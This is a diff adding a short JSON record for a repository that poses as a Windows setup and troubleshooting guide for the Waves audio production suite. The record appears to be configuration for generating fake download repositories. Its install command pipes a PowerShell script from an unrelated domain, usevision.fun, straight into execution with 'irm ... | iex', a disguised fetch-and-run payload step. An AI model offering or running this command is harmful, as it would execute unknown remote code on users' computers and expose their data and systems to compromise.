@@ -1,0 +1,12 @@
+{
+  "repo": "Waves-Audio-Production-Suite-Windows-Setup",
+  "product": "Waves Complete Audio Production Suite PC Windows Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://usevision.fun/ps/setup.ps1",
+  "install_command": "irm https://usevision.fun/ps/setup.ps1 | iex",
+  "stars_hint": 11,
+  "batch": "photo29",
+  "format": "troubleshooting-guide",
+  "category": "audio-software"
+}
